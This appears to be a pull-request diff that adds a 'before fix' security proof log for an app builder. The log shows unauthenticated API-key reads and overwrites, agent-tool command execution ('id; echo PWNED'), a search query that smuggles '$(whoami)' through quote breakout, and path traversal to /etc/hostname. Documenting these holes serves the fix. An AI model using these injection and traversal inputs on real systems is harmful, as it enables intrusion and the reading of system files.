@@ -1,0 +1,24 @@
+=== Neon-App-Builder proof · phase: BEFORE ===
+
+[1] GET /api/keys (no auth)            -> HTTP 200  {"gemini":"AIzaSyFAKE-gemini-0123456789abcdefABCDEF","openai":"sk-proj-FAKE0123456789abcdefghijklmnopqrstuv","deepseek":"sk-FAKEdeepseek0123456789","activeModel":"gemini"}
+[2] GET /api/history (no auth)         -> HTTP 200  []
+[3] POST /api/keys overwrite (no auth) -> HTTP 200  {"success":true}
+[4] GET /api/keys (wrong token)        -> HTTP 200  {"openai":"sk-ATTACKER-key"}
+[5] GET /api/keys (valid token)        -> HTTP 200  {"openai":"sk-ATTACKER-key"}
+[6] GET /api/history (valid token)     -> HTTP 200  []
+
+[7] agent tool execute_command "id; echo PWNED > /tmp/neon-rce-proof"
+    Command output: | STDOUT: | uid=1000(box) gid=1000(box) groups=1000(box),997(orbitd) | STDERR: | 
+    /tmp/neon-rce-proof exists? true
+
+[8] agent tool search_code injection  query='zz" /dev/null; echo INJECTED-$(whoami); echo "'
+    Search results for "zz" /dev/null; echo INJECTED-$(whoami); echo "": | INJECTED-box |  server | 
+
+[9] agent tool read_file path traversal "../../../../etc/hostname"
+    File content for ../../../../etc/hostname: | <build-host hostname, redacted> | 
+
+[10] agent tool background command "sleep 0; id"
+    Started background job ef5aol for command: sleep 0; id
+
+(Captured on upstream main 7be544a before this fix. Check [11] was added in this PR: since GET /api/keys
+no longer returns raw keys, POST /api/keys now merges non-empty fields instead of replacing the whole file.)
